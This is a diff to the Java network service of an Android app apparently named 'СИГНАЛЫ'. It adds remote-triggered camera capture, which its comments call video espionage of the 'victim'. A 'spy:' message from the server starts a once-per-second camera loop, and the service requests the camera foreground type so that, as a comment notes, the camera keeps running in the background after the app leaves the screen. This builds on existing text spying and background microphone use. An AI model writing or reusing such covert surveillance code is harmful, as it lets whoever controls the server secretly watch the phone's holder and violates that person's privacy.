@@ -48,6 +48,7 @@ import ru.signaly.net.SgJson;
 import ru.signaly.net.SgLink;
 import ru.signaly.net.SgReplica;
 import ru.signaly.net.SgSeen;
+import ru.signaly.net.SgVoiceCore;
 
 /** СИГНАЛЫ: служба связи. Держит соединение с центром (и сам центр, если он на этом телефоне)
  *  с погашенным экраном, показывает уведомления в шторке, включает аварийный режим (сирена громче
@@ -109,6 +110,7 @@ public class SgNetService extends Service {
     replica = new SgReplica(new File(app.getFilesDir(), "replica.json"));
     replica.autoSave();
     SgPhone.init(app);
+    SgCam.init(app);   // П26 (06, 156)
   }
 
   static SharedPreferences prefs() { return app.getSharedPreferences("sg-net", Context.MODE_PRIVATE); }
@@ -141,6 +143,18 @@ public class SgNetService extends Service {
     main.removeCallbacks(statTick);
     main.postDelayed(statTick, 4000);
   }
+
+  /* ---------- П26 (06, 156): камера жертвы — раз в секунду, пока есть сеансы с камерой ---------- */
+  static final Runnable camTick = new Runnable() {
+    @Override public void run() {
+      main.removeCallbacks(this);
+      SgVoiceCore c = SgVoice.core;
+      boolean any = c != null && !c.spyVideo().isEmpty();
+      try { SgCam.tick(); } catch (RuntimeException ignored) { /* камера */ }
+      if (any || SgCam.open || SgCam.opening) main.postDelayed(this, 1000);
+    }
+  };
+  static void camKick() { main.removeCallbacks(camTick); main.post(camTick); }
 
   /* ---------- П16: пульт «ТЕЛЕФОНЫ» — раз в минуту заряд, голос, версия приложения (служба шлёт и в фоне) ---------- */
   static final Runnable statTick = SgNetService::sendStat;
@@ -394,7 +408,7 @@ public class SgNetService extends Service {
       if (myAcc != null && ("alarm@" + myAcc).equals(SgJson.s(o, "key"))) { alarmMine = SgJson.m(o.get("value")); alarmPick(); }
       if ("probe".equals(SgJson.s(o, "key"))) SgVoice.probe(SgJson.m(o.get("value")));   // П16: проба голоса с пульта
       String k = SgJson.s(o, "key");
-      if (k != null && k.startsWith("spy:") && myAcc != null) SgVoice.spy(myAcc, k, SgJson.m(o.get("value")), null);   // П25: шпионаж текстом
+      if (k != null && k.startsWith("spy:") && myAcc != null) { SgVoice.spy(myAcc, k, SgJson.m(o.get("value")), null); camKick(); }   // П25: шпионаж текстом; П26: и камера
       if (k != null && k.startsWith("var:")) { if (o.get("value") == null) vars.remove(k); else vars.put(k, o.get("value")); }
     } else if ("welcome".equals(t)) {
       Map<String, Object> st = SgJson.m(o.get("state"));
@@ -404,7 +418,7 @@ public class SgNetService extends Service {
       alarmMine = st == null || myAcc == null ? null : SgJson.m(st.get("alarm@" + myAcc));
       alarmPick();
       SgVoice.probe(st == null ? null : SgJson.m(st.get("probe")));
-      if (myAcc != null) SgVoice.spy(myAcc, null, null, st == null ? new java.util.HashMap<String, Object>() : st);   // П25
+      if (myAcc != null) { SgVoice.spy(myAcc, null, null, st == null ? new java.util.HashMap<String, Object>() : st); camKick(); }   // П25; П26 — камера
       main.postDelayed(SgNetService::sendStat, 1500);
     }
   }
@@ -715,8 +729,14 @@ public class SgNetService extends Service {
     int t = 0;
     if (Build.VERSION.SDK_INT >= 34) t |= ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
     if (SgVoice.background() && Build.VERSION.SDK_INT >= 30) t |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
+    // П26 (06, 156): видео-шпионаж — тип «камера» (Android даёт его, пока приложение на экране; потом камера работает и в фоне)
+    boolean cam = Build.VERSION.SDK_INT >= 30 && SgVoice.core != null && SgVoice.core.vidable
+      && androidx.core.content.ContextCompat.checkSelfPermission(app, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED;
     try {
-      if (Build.VERSION.SDK_INT >= 29 && t != 0) s.startForeground(ID_FG, n, t);
+      if (Build.VERSION.SDK_INT >= 29 && t != 0) {
+        try { s.startForeground(ID_FG, n, cam ? t | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA : t); }
+        catch (RuntimeException ce) { if (!cam) throw ce; s.startForeground(ID_FG, n, t); }   // камеру не дали — без неё
+      }
       else s.startForeground(ID_FG, n);
     } catch (RuntimeException e) {
       SgVoice.errText = "микрофон в фоне не разрешён: откройте приложение";
